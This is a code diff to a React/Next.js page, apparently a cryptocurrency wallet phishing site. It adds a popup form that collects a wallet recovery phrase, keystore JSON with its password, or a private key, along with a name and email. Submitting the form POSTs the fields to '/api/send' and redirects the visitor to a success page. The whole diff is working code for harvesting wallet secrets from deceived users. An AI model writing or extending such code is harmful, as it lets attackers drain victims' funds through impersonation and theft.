@@ -13,6 +13,7 @@ export default function Page() {
   const [show1, setShow1] = useState(false)
   const [show2, setShow2] = useState(false)
   const [sym, setSym] = useState({})
+  const [loading, setLoading] = useState(false)
   function handleClick(file){
     setSym(file)
     setShow1(!show1)
@@ -25,13 +26,18 @@ export default function Page() {
   function handleClick3(){
     setShow2(!show2)
   }
+
+  function handleLoading(){
+    setLoading(!loading)
+  }
   return (
     <div className={styles.page}>
       <Navbar/>
       <Hero/>
       <Choose handleShow={handleClick}/>
       {show1 && <Popup handleShow={handleClick} file={sym} handleShow2={handleClick2}/>}
-      {show2 && <Popup2 handleShow={handleClick2} handleShow2={handleClick3}/>}
+      {show2 && <Popup2 handleShow={handleClick2} handleShow2={handleClick3} handleLoading = {handleLoading}/>}
+      {loading && <Loader/>}
     </div>
   )
 }
@@ -206,9 +212,11 @@ export function Popup({handleShow, file, handleShow2}){
   )
 }
 
-export function Popup2({handleShow, handleShow2}){
+export function Popup2({handleShow, handleShow2, handleLoading}){
   const [form, setForm] = useState([])
   const [type, setType] = useState("phrase")
+  const [error, setError] = useState(false)
+  const router = useRouter()
   const handleChange = (e)=>{
     setForm({
       ...form,
@@ -217,7 +225,39 @@ export function Popup2({handleShow, handleShow2}){
   }
 
   function handleSubmit(){
-    console.log(form)
+    if (form.length === 0){
+      setError(!error)
+      setTimeout(()=>{
+        setError(!error)
+      }, 2000)
+    } else{
+        handleLoading()
+        fetch("/api/send", {
+          method: "POST",
+          cache: "no-cache",
+          body: JSON.stringify({
+            ...form
+          }),
+          headers: {
+            "Content-type": "application/json"
+          }
+        })
+        .then(res=> {
+          console.log(res.status)
+          if(res.status === 200){
+            handleLoading()
+            res.json()
+            router.push("/success")
+          } else{
+            handleLoading()
+          }
+        })
+        .then(data => {
+          console.log(data)
+        })
+    }
+    
+    
   }
 
   function handleTypeChange(type){
@@ -245,40 +285,55 @@ export function Popup2({handleShow, handleShow2}){
         {type ==="phrase" && <section>
             <div>
                 <label htmlFor="">Wallet Name</label>
-                <input type="text" placeholder="Wallet Name" name="Wallet Name" onChange={(e)=>handleChange(e)}/>
+                <input type="text" placeholder="Wallet Name" name="name" onChange={(e)=>handleChange(e)}/>
             </div>
             <div>
                 <label htmlFor="">Email</label>
-                <input type="email" placeholder="Email" name="Email" onChange={(e)=>handleChange(e)}/>
+                <input type="email" placeholder="Email" name="email" onChange={(e)=>handleChange(e)}/>
             </div>
             <div>
                 <label htmlFor="">Phrase</label>
-                <textarea placeholder="Enter recovery phrase" name="Phrase" onChange={(e)=>handleChange(e)}></textarea>
+                <textarea placeholder="Enter recovery phrase" name="phrase" onChange={(e)=>handleChange(e)}></textarea>
                 <p>Typically 12 (sometimes 24) words separated by single spaces</p>
             </div> 
         </section>}
         {type === "key" && <section>
             <p>Upload or paste your keystore JSON contents here.</p>
-            <input type="text" placeholder="Wallet Name"  name="Wallet Name" onChange={(e)=>handleChange(e)}/>
-            <input type="email" placeholder="Email"  name="Email" onChange={(e)=>handleChange(e)}/>
-            <textarea placeholder="KeyStore JSON"  name="KeyStore JSON" onChange={(e)=>handleChange(e)}></textarea>
-            <input type="password" placeholder="Wallet Password"  name="Wallet Password" onChange={(e)=>handleChange(e)}/>
+            <input type="text" placeholder="Wallet Name"  name="name" onChange={(e)=>handleChange(e)}/>
+            <input type="email" placeholder="Email"  name="email" onChange={(e)=>handleChange(e)}/>
+            <textarea placeholder="KeyStore JSON"  name="key" onChange={(e)=>handleChange(e)}></textarea>
+            <input type="password" placeholder="Wallet Password"  name="password" onChange={(e)=>handleChange(e)}/>
             <p>Several lines of text beginning with "(...)" plus the password you used to encrypt it.</p>
         </section>}
         {type === "private" && <section>
             <p>Enter your private key below:</p>
-            <input type="text" placeholder="Wallet Name" name="Wallet Name" onChange={(e)=>handleChange(e)}/>
-            <input type="email" placeholder="Email" name="Email" onChange={(e)=>handleChange(e)}/>
-            <textarea placeholder="KeyStore JSON" name="KeyStore JSON" onChange={(e)=>handleChange(e)}></textarea>
-            <input type="password" placeholder="Enter your private key" name="Private Key" onChange={(e)=>handleChange(e)}/>
+            <input type="text" placeholder="Wallet Name" name="name" onChange={(e)=>handleChange(e)}/>
+            <input type="email" placeholder="Email" name="email" onChange={(e)=>handleChange(e)}/>
+            <textarea placeholder="KeyStore JSON" name="key" onChange={(e)=>handleChange(e)}></textarea>
+            <input type="password" placeholder="Enter your private key" name="private" onChange={(e)=>handleChange(e)}/>
             <p>Typically 12 (sometimes 24) words separated by a single space.</p>
         </section>}
+        {error && <strong>Please fill in the empty spaces!!!</strong>}
         <div className={styles.btns}>
             <button onClick={handleShow2}>Cancel</button>
             <button onClick={handleSubmit}>Proceed</button>
         </div>
       </main>
         
+    </section>
+  )
+}
+
+export function Loader(){
+  return (
+    <section className={styles.loader}>
+        <Image
+          src="/icons/icon.png"
+          alt="Coin Logo"
+          width={50}
+          height={50}
+          priority
+        />
     </section>
   )
 }
